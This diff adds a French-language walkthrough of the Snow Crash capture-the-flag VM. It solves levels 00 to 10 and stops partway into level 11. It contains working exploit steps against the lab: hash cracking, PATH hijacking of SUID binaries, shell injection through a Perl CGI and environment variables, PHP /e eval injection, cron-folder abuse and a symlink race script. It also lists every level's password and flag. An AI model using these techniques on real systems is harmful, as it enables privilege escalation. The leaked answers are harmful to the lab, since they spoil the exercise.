@@ -1,0 +1,1169 @@
+Snow Crash completion
+
+Outils pour sonder les levels:
+    whoami                          
+    pwd && ls -la                   
+    find / -user flagXX 2>/dev/null 
+    find / -perm -4000 2>/dev/null              -> check le SUID => prog avec SUID s'execute avec les droits de son propriétaire, pas forcement les droits de la personne qui execute: -rw s r-xr-x => le s au lieu du x signifie que le bit est activé, le prog s'execute en root
+    cat /etc/crontab && ls -la /etc/cron.d/  
+    ps aux                          
+    ss -tlnp  ou  netstat -tlnp        
+	nc -l
+
+Type de vulnérabiité
+    Script
+    Binaire -> file / strings / ltrace => gdb ou Ghidra
+    réseau -> check protocole et test injections => nc localhost <port>
+    capture -> PCAP => WireShark pour scruter les échanges
+
+Familles de failles
+    Permissions                     -> fichier world-writable / SUID mal placé / dossier 
+    Injections                      -> :id / $(id) / | id
+    Compare / secret en clair       -> mdp visible ltrace
+    Race condition                  -> prog check puis utilise le fichier
+    Path hijacking                  -> appel d'une commande sans chemin absolu
+    Faille crypto                   -> hash cassable
+    Crontab / service               -> execute en root un fichier
+    Buffer overflow / format string ->
+
+
+Failles réseaux:
+    Sniffing passif 	->  protocole en clair, les données sont non chiffrés, les ids et donnés sont brutes
+                        	n'importe qui intercepte le traffic peut lire
+    Spoofing        	-> Usurpation d'id ->	ARP	->	Répondre aux requêtes ARP en se faisant passer pour la passerelle, le traffic de la victime transite vers nous
+                            	                DNS	->	Répondre plus vite que le serveur DNS pour redirigier un domaine vers une IP contrôlée
+                                	            IP	->	Falsifier l'addresse source d'un paquet
+	Hijacking			-> Vol d'un cookie ou d'un token pour s'insérer dans une connexion
+	TOCTOU				-> Time Of Check To Time Of Use => Verifie une resource à T1 puis l'utilise à T2 sauf que la resource peut avoir changé entre temps
+
+
+[Observer la machine]
+       │
+       ▼
+[Identifier une anomalie]
+       │
+       ▼
+[Comprendre la vulnérabilité]
+       │
+       ▼
+[Exploiter la vulnérabilité]
+
+find / -perm -4000 2>/dev/null |=> man find [-perm -mode]: All of the permission bits mode are set for the file, 4000 -> bit SUID
+-> check le SUID => prog avec SUID s'execute avec les droits de son propriétaire,
+pas forcement les droits de la personne qui execute: -rw s r-xr-x => le s au lieu du x signifie que le bit est activé, le prog s'execute en root
+
+
+file    -> Qu'est ce que ce fichier.
+strings -> Quelles chaines lisibles sont cachées.
+objdump -> Quelles instructions asm contient-il.
+
+
+$ su flag00
+Password:
+Don't forget to launch getflag!
+$ getflag
+Check flag.Here is your token: ?????????????????
+$ su level01
+Password:
+
+----------------------------------------------------------------------------------------------
+Level00:
+
+level00@SnowCrash:~$ find / -user flag00 2>/dev/null
+/usr/sbin/john
+/rofs/usr/sbin/john
+
+level00@SnowCrash:~$ cat /usr/sbin/john 
+cdiiddwpgswtgt
+
+Caesar cipher ROT15
+
+Password    => nottoohardhere
+Flag        => x24ti5gi3x0ol2eh4esiuxias
+
+----------------------------------------------------------------------------------------------
+Level01:
+
+level01@SnowCrash:~$ cat /etc/passwd | grep flag01
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+nom : mot_de_passe : UID : GID : commentaire : home : shell
+    : x            : => signifie que le hash du mdp est stocké ailleurs => /etc/shadow (pas les perms)
+
+42hDRfypTqqnw -> Hash Analyser:
+-------------------------
+Hash:	42hDRfypTqqnw
+Hash type:	DES or 3DES?
+Bit length:	0
+Character length:	13
+Character type:	Unknown
+-------------------------
+Hashcat pour décrypter:
+
+hashcat -m 1500 -a 0 pass rockyou.txt
+1500 => DES
+rockyou.txt => wordlist des mdp faibles
+
+42hDRfypTqqnw:abcdefg
+
+Password    => abcdefg
+Flag        => f2av5il02puano7naaf6adaaf
+
+----------------------------------------------------------------------------------------------
+Level02:
+
+----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
+
+fichier PCAP -> WireShark pour analyse
+scp pour copier le fichier en ssh hors de la vm
+
+Clic droit -> Follow -> TCP Stream
+
+..wwwbugs login: l.le.ev.ve.el.lX.X
+..
+Password: ft_wandr...NDRel.L0L
+.
+..
+Login incorrect
+wwwbugs login: 
+
+Protocole TELNET:
+chaque caract est tapé et envoyé individuellement
+Dans ce cas, il y a à la fois la capture input et l'écho du serveur (les caracts sont dupliqués)
+
+en séparant les flux client->serveur:
+levelX
+ft_wandr...NDRel.L0L
+
+le password n'est pas bon, donc les points '.' sont probablement des caracts ascii non imprimables
+
+Analyse HexDump:
+000000B2  6c                                                 l
+000000B3  65                                                 e
+000000B4  76                                                 v
+000000B5  65                                                 e
+000000B6  6c                                                 l
+000000B7  58                                                 X
+000000B8  0d                                                 .  ---> Séparation login / passwd
+000000B9  66                                                 f
+000000BA  74                                                 t
+000000BB  5f                                                 _
+000000BC  77                                                 w
+000000BD  61                                                 a
+000000BE  6e                                                 n
+000000BF  64                                                 d
+000000C0  72                                                 r
+000000C1  7f                                                 .  ---> Delete
+000000C2  7f                                                 .  ---> Delete
+000000C3  7f                                                 .  ---> Delete
+000000C4  4e                                                 N
+000000C5  44                                                 D
+000000C6  52                                                 R
+000000C7  65                                                 e
+000000C8  6c                                                 l
+000000C9  7f                                                 .  ---> Delete
+000000CA  4c                                                 L
+000000CB  30                                                 0
+000000CC  4c                                                 L
+000000CD  0d                                                 .  ---> retour chariot
+
+man ascii:
+7F    DEL
+2E    .
+0D    CR  '\r' (carriage ret)
+0A    LF  '\n' (new line)
+5F    _
+
+Password    => ft_waNDReL0L
+Flag        => kooda2puivaav1idi4f57q8iq
+
+
+----------------------------------------------------------------------------------------------
+Level03:
+
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
+
+file:
+level03@SnowCrash:~$ file level03
+level03: setuid setgid ELF 32-bit LSB executable,
+    Intel 80386, version 1 (SYSV),
+    dynamically linked (uses shared libs),
+    for GNU/Linux 2.6.24,
+    BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+
+ELF     -> exec linux
+setuid  -> s'execute avec les droits de son proprio
+
+
+execute:
+level03@SnowCrash:~$ ./level03 
+Exploit me
+
+
+strings:
+level03@SnowCrash:~$ strings level03
+/usr/bin/env echo Exploit me    => Possible Path hijacking
+/home/user/level03/level03.c    => introuvable
+
+/usr/bin/env echo -> utilise $PATH pour trouver echo et l'execute, 
+exemple:
+$ /usr/bin/env echo "test test"
+test test
+
+1-> Mettre en place un "faux" echo et lui donner les droits d'exec
+    $ cd /tmp/
+    $ touch echo
+    $ chmod +x echo
+2-> Ajouter le chemin vers le "faux" echo dans $PATH en 1ère position
+    $ export PATH=/tmp:$PATH
+    $ echo $PATH
+    /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+3-> Donner des instructions au "faux" echo pour trouver le passwd
+    #!/bin/sh
+    getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Password    => 
+Flag        => qi0maab88jeaj46qoumi7maus
+
+
+----------------------------------------------------------------------------------------------
+Level04:
+
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
+
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+execute:
+level04@SnowCrash:~$ ./level04.pl 
+Content-type: text/html
+\n
+\n
+
+Compréhension perl:
+sub x { } = fonction
+$_[0] = premier argument passé à la fonction
+$y = $_[0]; stocke cet argument dans la variable $y
+Les backticks `` en Perl (comme en bash) exécutent une commande shell et retournent sa sortie sous forme de texte
+print affiche le résultat de cette commande dans la réponse HTTP
+
+x(param("x")); => Appelle x en lui passant comme argument la valeur du paramètre HTTP nommé x
+
+Si un client fait une requête: http://localhost:4747/level04.pl?x=quelquechose
+le script va print "quelquechose"
+
+Pas de Path hijacking, le vrai echo est utilisé
+le script récup l'arg sans protection, possible faille
+
+Le script possède les droits proprio donc possible de mettre une commande dans la var pour pousser echo à donner les infos
+
+http://localhost:4747/level04.pl?x=quelquechose
+$ quelquechose
+
+level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=test;getflag"
+curl: (3) Illegal characters found in URL
+Le ';' ne passe dans l'encodage URL -> utilise l'encodage
+;   => %3B
+
+level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=test%3Bgetflag"
+test
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Password    => 
+Flag        => ne2searoevaevoem4ov4ar8ap
+
+----------------------------------------------------------------------------------------------
+Level05:
+
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:~$ file /usr/sbin/openarenaserver 
+/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
+
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver*
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+script de cron
+boucle sur chaque fichier du dossier, execute les fichiers puis les supps
+le fichier est execute dans un sous shell donc env isolé
+ulimit -t 5 empeche le script de tourner indefiniment
+bash -x $i execute le fichier en mode debug
+
+le dossier possède les droits d'écriture et de lecture donc possible d'y metter les scripts
+
+Objectif -> Pousser cron a executer des commandes avec les privilèges root
+
+level05@SnowCrash:/opt$ service cron status 2>/dev/null
+cron start/running, process 1258
+level05@SnowCrash:/opt$ ps aux | grep cron
+root      1258  0.0  0.0   2616   900 ?        Ss   18:38   0:00 cron
+
+Un cron tourne bien sur la machine
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+Possibilitées:
+
+-> Creer un fichier a part et pousser le script a lui donner les droits ==> Sous shell est isolé => le subShell est une copie du shell parent donc si un script est deja present il est copié dedans
+    Meme principe que le level du path Hijacking, cron donne les droits a autre script/bin qui appelle getFlag
+
+script.sh:
+
+#!/bin/sh
+id > /tmp/here.txt
+getflag > /tmp/fag.txt
+
+-----------------------
+En attendant que Cron fasse son travail:
+watch -n 1 'ls -la /opt/openarenaserver/'
+
+resultat de id:
+uid=3005(flag05) gid=3005(flag05) groups=3005(flag05),1001(flag)
+
+cron a les droits de flag05 donc je peux juste faire getflag vers un .txt
+
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/fag.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Password    => 
+Flag        => viuaaale9huek52boumoomioc
+
+----------------------------------------------------------------------------------------------
+Level06:
+
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
+
+level06@SnowCrash:~$ file level06
+level06: setuid ELF 32-bit LSB executable, 
+Intel 80386, 
+version 1 (SYSV), 
+dynamically linked (uses shared libs), 
+for GNU/Linux 2.6.24, 
+BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
+
+level06@SnowCrash:~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+level06.php:
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+format lisible:
+
+function y($m) { 
+    $m = preg_replace("/\./", " x ", $m);       -> Remplace chaque . par x
+    $m = preg_replace("/@/", " y", $m);         -> remplace chaque @ par y
+    return $m; 
+}
+
+function x($y, $z) { 
+    $a = file_get_contents($y);                                 -> lit le fichier passer en arg $y et stocke son contenu dans $a
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);     -> A voir plus bas
+    $a = preg_replace("/\[/", "(", $a);                         -> remplace [ par (
+    $a = preg_replace("/\]/", ")", $a);                         -> remplace ] par )
+    return $a; 
+}
+
+$r = x($argv[1], $argv[2]); print $r;           -> appel x() avec 1er et 2nd arg de prog puis affiche le return soit $a
+
+preg_replace -> Perform a regular expression search and replace
+
+!!! Point IMPORTANT !!!
+Dans le man de preg_replace:
+
+Errors/Exceptions
+Using the "\e" modifier is an error; an E_WARNING is emitted in this case. 
+
+=> L'utilisation du modifier depracated ouvre une faille
+level06@SnowCrash:~$ php --version
+PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
+
+
+Dans les anciennes versions de PHP, le /e servait a évaluer le résultat de la substitution comme du code PHP
+exemple concret:
+$texte = "2+3";
+// Sans /e : affiche littéralement "2+3"
+echo preg_replace('/(\d+)\+(\d+)/', '$1+$2', $texte);      // 2+3
+
+// Avec /e : évalue l'expression PHP
+echo preg_replace('/(\d+)\+(\d+)/e', '$1+$2', $texte);     // 5
+
+il était pratique mais fut depracated car dangereux
+
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+/(\[x (.*)\])/  -> cherche '[x' dans $a, récup tout via (.*)  jusqu'à ']'
+
+y(...)      -> y() appel la fonction y
+\"\\2\"     -> \\2 fait ref au second bloc de la capture => (.*)
+
+A cause du /e, "y(\"\\2\")" sera exec comme du code PHP sachant que le script à les droits root on peut utiliser getflag
+
+function shell_exec(string $command): string|false|null
+shell_exec — Execute command via shell and return the complete output as a string
+
+=>  Le 1er arg doit être un fichier avec du contenu
+=>  Le contenu du fichier doit pouvoir "survivre" au replace ET SUIVRE LES REGLES DU REGEX => les replaces sont apres l'appel de la cmd donc ok
+=>  le script doit finir par lancer un getflag
+=>  [x ${`getflag`} ]
+
+level06@SnowCrash:~$ ./level06 /tmp/test.txt
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+in /home/user/level06/level06.php(4) : regexp code on line 1
+
+Password    => 
+Flag        => wiok45aaoguiboiki2tuin6ub
+
+----------------------------------------------------------------------------------------------
+Level07:
+
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
+
+level07@SnowCrash:~$ file level07 
+level07: setuid setgid ELF 32-bit LSB executable,
+Intel 80386, version 1 (SYSV),
+dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
+
+level07@SnowCrash:~$ ./level07 
+level07
+
+level07@SnowCrash:~$ strings level07 
+LOGNAME
+/bin/echo %s
+
+level07@SnowCrash:~$ echo $LOGNAME
+level07
+
+LOGNAME=level07
+
+Confirmation que l'exec utilise une var d'env modifiable
+
+Injection possible via un export
+
+export LOGNAME='$(getflag)'
+
+level07@SnowCrash:~$ export LOGNAME='$(getflag)'
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+
+Password    => 
+Flag        => fiumuikeil55xe9cu4dood66h
+
+----------------------------------------------------------------------------------------------
+Level08:
+
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
+
+level08@SnowCrash:~$ file level08 
+level08: setuid setgid ELF 32-bit LSB executable,
+Intel 80386, version 1 (SYSV),
+dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
+
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+
+level08@SnowCrash:~$ echo " test " > /tmp/test.txt
+level08@SnowCrash:~$ ./level08 /tmp/test.txt
+ test 
+
+level08@SnowCrash:~$ strings level08
+read
+open
+%s [file to read]
+token
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d
+;*2$"
+
+A vue d'oeil il semblerait que le bin lit le contenu du fichier puis lance une comparaison entre l'input et le token
+
+A check sous objdump ou gdb => le token doit etre save quelque part dans la stack
+
+objdump -d:
+Parties interressantes;
+ 80485fa:       89 04 24                mov    %eax,(%esp)
+ 80485fd:       e8 6e fe ff ff          call   8048470 <open@plt>       -> ouverture du fichier
+ 8048602:       89 44 24 24             mov    %eax,0x24(%esp)
+ 8048606:       83 7c 24 24 ff          cmpl   $0xffffffff,0x24(%esp)
+ 804860b:       75 21                   jne    804862e <main+0xda>
+ 804860d:       8b 44 24 1c             mov    0x1c(%esp),%eax
+ 8048611:       83 c0 04                add    $0x4,%eax
+ 8048614:       8b 00                   mov    (%eax),%eax
+ 8048616:       89 44 24 08             mov    %eax,0x8(%esp)
+ 804861a:       c7 44 24 04 b2 87 04    movl   $0x80487b2,0x4(%esp)
+ .
+ .
+ .
+ 8048636:       8d 44 24 2c             lea    0x2c(%esp),%eax
+ 804863a:       89 44 24 04             mov    %eax,0x4(%esp)
+ 804863e:       8b 44 24 24             mov    0x24(%esp),%eax
+ 8048642:       89 04 24                mov    %eax,(%esp)
+ 8048645:       e8 c6 fd ff ff          call   8048410 <read@plt>       -> lecture du contenu
+ 804864a:       89 44 24 28             mov    %eax,0x28(%esp)
+ 804864e:       83 7c 24 28 ff          cmpl   $0xffffffff,0x28(%esp)   -> comparaison faite ici => sous gdb check cette addr
+ 8048653:       75 1c                   jne    8048671 <main+0x11d>
+ 8048655:       8b 44 24 24             mov    0x24(%esp),%eax
+ 8048659:       89 44 24 08             mov    %eax,0x8(%esp)
+ 804865d:       c7 44 24 04 c4 87 04    movl   $0x80487c4,0x4(%esp)
+
+........
+
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+level08@SnowCrash:~$ ./level08 token 
+You may not access 'token'
+
+En gros il faut juste trouver un moyen de lui passer le fichier token pour qu'il print le token
+La comparaison est faite sur le nom du fichier "token"
+impossible de le rename le fichier
+
+creer un raccourci vers token mais avec un name diff => lien symbolique
+
+==> Il faut donner le chemin absolu a ln sinon il fait chier
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/there
+level08@SnowCrash:~$ ./level08 /tmp/there
+quif5eloekouj29ke0vouxean
+
+
+Password    => quif5eloekouj29ke0vouxean
+Flag        => 25749xKZ8L7DkSCwJkT9dyv6f
+
+----------------------------------------------------------------------------------------------
+Level09:
+
+-rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09*
+----r--r-- 1 flag09  level09   26 Mar  5  2016 token
+
+level09@SnowCrash:~$ cat token 
+f4kmm6p|=�p�n��DB�Du{��
+
+level09@SnowCrash:~$ file level09 
+level09: setuid setgid ELF 32-bit LSB executable,
+Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0x0e1c5a0dfb537112250e1c78d5afec3104abb143, not stripped
+
+level09@SnowCrash:~$ ./level09 
+You need to provied only one arg.
+
+level09@SnowCrash:~$ ./level09 token 
+tpmhr
+
+level09@SnowCrash:~$ strings level09
+putchar
+stdout
+fputc
+getenv
+stderr
+ptrace
+fwrite
+open
+[^_]
+You should not reverse this
+LD_PRELOAD
+Injection Linked lib detected exit..
+/etc/ld.so.preload
+/proc/self/maps
+/proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
+libc
+You need to provied only one arg.
+00000000 00:00 0
+LD_PRELOAD detected through memory maps exit ..
+
+
+level09@SnowCrash:~$ ./level09 "     "  -> 5 espaces
+ !"#$
+level09@SnowCrash:~$ ./level09 " "      -> 1 espace
+ 
+level09@SnowCrash:~$ ./level09 "  "     -> 2 espaces
+ !
+
+level09@SnowCrash:~$ ./level09 "abc"
+ace
+
+Il semblerait que l'exec encode/decode l'arg, la position du caract est prise en compte
+
+d       c
+32    SPACE
+33    !
+34    "
+35    #
+36    $
+
+=> additione le caract par sa position dans la string 
+
+Faire l'inverse pour trouver decoder le token
+
+#include <stdio.h>
+int main(int ac, char** av) {
+
+int i = 0;
+char* v = av[1];
+while (*v) {
+    printf("%c", *v++ - i++);
+}
+printf("\n");
+return 0;
+}
+
+level09@SnowCrash:~$ cd /tmp
+level09@SnowCrash:/tmp$ gcc script.c
+level09@SnowCrash:/tmp$ cd
+level09@SnowCrash:~$ cat token | xargs /tmp/a.out
+f3iji1ju5yuevaus41q1afiuq
+
+
+Password    => f3iji1ju5yuevaus41q1afiuq
+Flag        => s5cAJpM8ev6XHw998pRWG728z
+
+----------------------------------------------------------------------------------------------
+Level10:
+
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+level10@SnowCrash:~$ file level10 
+level10: setuid setgid ELF 32-bit LSB executable,
+Intel 80386, version 1 (SYSV),
+dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
+
+level10@SnowCrash:~$ ./level10 
+./level10 file host
+        sends file to host if you have access to it
+level10@SnowCrash:~$ ./level10 token level10
+You don't have access to token
+
+level10@SnowCrash:~$ ./level10 level10 level10
+Connecting to level10:6969 .. Unable to connect to host level10
+
+level10@SnowCrash:~$ strings ./level10
+%s file host
+        sends file to host if you have access to it
+Connecting to %s:6969 .. 
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. 
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+
+La connexion se fait via le port 6969 
+
+level10@SnowCrash:~$ ./level10 level10 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+Essayer d'ecouter sur le port:
+nc -lv 6969     => A faire sur une autre session ssh !
+
+ssh execute exec:
+
+level10@SnowCrash:~$ ./level10 level10 10.0.2.15
+Connecting to 10.0.2.15:6969 .. Connected!
+Sending file .. wrote file!
+
+ssh ecoute:
+level10@SnowCrash:~$ nc -lv 6969
+Connection from 10.0.2.15 port 6969 [tcp/*] accepted
+.*( )*.
+ELF 4$4         ($!444  TTTT
+                            T
+                             8X(((��hhhDDP�td\
+                                              \\44Q�tdR�td��/lib/ld-linux.so.2GNUGNU���W�h�}1֟}�5A�f�# )��K��x`0O<J� 7���g�)�B}`<__gmon_start__libc.so.6_IO_stdin_usedsocketfflushexithtonsconnectputs__stack_chk_failprintf__errno_locationreadstdoutinet_addropenaccessstrerror__libc_start_mainwrite��iBC_2.4GLIBC_2.0ii
+ �      $�
+(�
+ ,�
+48<@S��[���������t�����[��5��%��%h������%������h������%
+                                                       h�����%h �����%h(�����%h0�����%h8�p����% h@�`����%$hH�P����%(hP�@����%,hX�0����%0h`� ����%4hh�����%8hp�����%<hx������%@h������1�^����PTRhhpQVh�o�����������������U��S���=du?�h� ������9�s�����h���h9�r��d��[]Ít&��'U����$��t���t     �$$���ÐU�����P�E
+����$�q����D$�@�D$(�D$��D$,�D$����D$�$���������{�T$,�T$�$�����`�$�����D�D$�$�\����D$0��$<��@��@
+                                                                                               fǄ$<�D$,�$�0�����$@�$9m���f��$>�D��$<�D$�D$0�$�������u!���T$,�T$�$������$�`�����D$��D$0�$�t������u!���T$,�T$�$�����$������$�����`�$�����D$�D$(�$�����D$4�|$4�u�$������$������D�D$<�D$�D$4�$�1����D$8�|$8�u,�������$�w�����D$�$�����$�z����D$8�D�D$<�D$�D$0�$�����$3�"�����?�T$(�T$�$�������$Le3t������Ð����������������Ë$Ð���������U��S������t�f����Ћ���u��[]Ð�S��[��������[�%s file host�
+        sends file to host if you have access to it
+Connecting to %s:6969 .. Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. Damn. Unable to open fileUnable to read from file: %s
+wrote file!You don't have access to %s
+0����Lx���p��������������zR|
+                            P���F
+                                 J
+��                                tx?;*2$"@�����B
+  8`|���a�A
+           �A�A�N0JA�A
+                      ��A�������������������
+���o�Ё                                      Є
+�
+
+=> Point important: Le transfert ne fonctionne que s'il y a une ecoute de l'autre côté
+
+        sends file to host if you have access to it
+Connecting to %s:6969 .. Unable to connect to host %s
+.*( )*.                                                                 -> Regex ?
+Unable to write banner to host %s
+Connected!
+Sending file .. Damn. Unable to open fileUnable to read from file: %s
+wrote file!You don't have access to %s                                  -> verif sur les droits
+
+Avec un fichier .txt
+
+exec:
+level10@SnowCrash:~$ echo "salut" > /tmp/asd.txt
+level10@SnowCrash:~$ ./level10 /tmp/asd.txt 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+ecoute:
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+
+level10@SnowCrash:~$ ltrace ./level10 /tmp/asd.txt 127.0.0.1
+access("/tmp/asd.txt", 4)                                   = 0
+connect(3, 0xbffff71c, 16, 0, 0)                            = 0
+open("/tmp/asd.txt", 0, 010)                                = 4
+read(4, "salut\n", 4096)                                    = 6
+write(3, "salut\n", 6)                                      = 6
+puts("wrote file!"wrote file!)                              = 12
+
+Via ltrace on remarque un TOUCTOU => access -> connect -> open
+
+access vérifie les droits du fichier 	-> OK pour asd.txt mais pas pour token
+connect lance la connection TCP			-> LENT
+open ouvre le fichier puis le lit		-> valeur du TOKEN
+
+A program is vulnerable to a TOCTOU race condition if it:
+    Checks some property or validates some data, and then
+    Takes some action based on this information;
+
+and the following are the case:
+    It is possible for other programs that run concurrently with this program to execute in between steps 1 and 2 (the operation is not atomic), and
+    Other programs can change the property or data (existence of outside control).
+
+Then, if another process does in fact change the property between step 1 and 2, step 2 is performed based on outdated information, which can have unintended consequences.
+
+=> Trouver un moyen de refaire la même chose mais swap de fichier pendant que connect est en cours
+
+Séquence:
+
+0->	nc -lvk 6969	-> k permet de garder la connection ouverte apres l'ecriture
+1->	access sur asd.txt avec les droits
+2->	connect prend son temps
+3=>	changer l'arg par ./token		-> swap ? X -> Lien symbolique ? A tester	=> ln -s /tmp/asd.txt /home/user/level10/token
+4-> open, read & write sur ./token
+
+Exemple d'attaque wiki:
+
+Victim		-> access(file)
+Attacker	-> symlink("/etc/passwd", "file")
+Victim		-> open("file", O_WRONLY); write(fd, buffer, sizeof(buffer));
+
+an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database.
+TOCTOU races can be used for privilege escalation to get administrative access to a machine.
+
+Although this sequence of events requires precise timing,
+it is possible for an attacker to arrange such conditions without too much difficulty.
+
+Exploiting a TOCTOU race condition requires precise timing to ensure that the attacker's operations interleave properly with the victim's.
+In the example above, the attacker must execute the symlink system call precisely between the access and open.
+
+In the case of BSD 4.3 mail utility and mktemp(),
+the attacker can simply keep launching mail utility in one process,
+and keep guessing the temporary file names and keep making symlinks in another process.
+The attack can usually succeed in less than one minute.
+
+===> Faire tourner en boucle un script qui creer les liens symbolique entre asd.txt et token puis exec jusqu'à avoir le bon timing
+
+script.sh
+
+#!/bin/bash
+while true; do
+	ln -sf /tmp/asd.txt &>/dev/null
+	ln -sf /tmp/asd.txt /tmp/sad.txt &>/dev/null
+	ln -sf /home/user/level10/token /tmp/sad.txt &>/dev/null
+done &
+SWITCH_PID=$!
+
+ex.sh
+
+#!/bin/bash
+while true; do
+	/home/user/level10/level10 /tmp/sad.txt 127.0.0.1
+	sleep 0.01
+done
+
+===>>>
+woupa2yuojeeaaed06riuj63c
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+salut
+
+Password    => woupa2yuojeeaaed06riuj63c
+Flag        => feulo4b72j7edeahuete3no7c
+
+----------------------------------------------------------------------------------------------
+level11
+
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
+
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+
+level11@SnowCrash:~$ ./level11.lua 
+lua: ./level11.lua:3: address already in use
+stack traceback:
+        [C]: in function 'assert'
+        ./level11.lua:3: in main chunk
+        [C]: ?
+
+-> Il semblerait que le script soit deja entrain de tourner sur la machine
+-> Je suis sur 127.0.0.1:4242 -> pas une interference
+
+level11@SnowCrash:~$ netstat -tln | grep 5151
+tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
+
+en essayant d'ecouter:
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: feulo4b72j7edeahuete3no7c
+Erf nope..
+
+=> Point important:
+Le script tourne deja sur la machine
+Il demande un password a qui tente de se connecter sur le serveur
+Le Password est hashé puis comparé
+
+Ce qui ouvre 2 Possibilitées
